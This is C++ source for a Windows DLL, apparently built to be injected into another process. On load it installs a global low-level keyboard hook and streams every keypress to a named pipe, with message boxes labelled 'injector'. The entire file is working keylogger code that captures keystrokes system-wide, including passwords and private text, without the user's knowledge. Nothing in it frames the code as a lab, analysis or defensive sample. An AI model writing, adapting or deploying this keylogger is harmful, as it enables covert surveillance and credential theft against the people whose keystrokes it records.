#include <Windows.h>
#include <string>
#include <Psapi.h>

static const char* PIPE_NAME = "\\\\.\\pipe\\Pipe";
static HHOOK hook;
static HANDLE pipe;
static DWORD mainThread;

static void writePipe(const char* msg)
{
	WriteFile(pipe,
		msg,
		strlen(msg) + 1,
		nullptr,
		nullptr
	);
}
static LRESULT CALLBACK KeyCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	char buffer[256];
	
	if (nCode >= 0)
	{
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
		{
			KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			char c = (char) MapVirtualKey(kbdStruct.vkCode, MAPVK_VK_TO_CHAR);
			sprintf_s(buffer, "%c", c);
			writePipe(buffer);
		}
	}

	return CallNextHookEx(hook, nCode, wParam, lParam);
}

static DWORD WINAPI threadFunction(void* param)
{
	pipe = CreateFile(TEXT(PIPE_NAME),
		GENERIC_READ | GENERIC_WRITE,
		0,
		nullptr,
		OPEN_EXISTING,
		0,
		nullptr);
	if (pipe == INVALID_HANDLE_VALUE)
	{
		MessageBox(nullptr, "Pipe failed", "injector", MB_OK);
	}

	hook = SetWindowsHookEx(
		WH_KEYBOARD_LL,
		KeyCallback,
		nullptr,
		0
	);
	if (hook == nullptr) MessageBox(nullptr, "Hook failed", "injector", MB_OK);

	writePipe("Injector start");
	MSG msg;
	while (GetMessage(&msg, nullptr, 0, 0));
	writePipe("Injector end");

	return 0;
}

static void init()
{
	mainThread = GetCurrentThreadId();
	CreateThread(nullptr, 0, threadFunction, nullptr, 0, nullptr);
}
static void teardown()
{
	UnhookWindowsHookEx(hook);
	CloseHandle(pipe);
}

BOOLEAN WINAPI DllMain(
	HINSTANCE dll,
	DWORD     reason,
	LPVOID    reserved)
{
	if (reason == DLL_PROCESS_ATTACH)
	{
		init();
	}
	else if (reason == DLL_PROCESS_DETACH)
	{
		teardown();
	}

	return true;
}
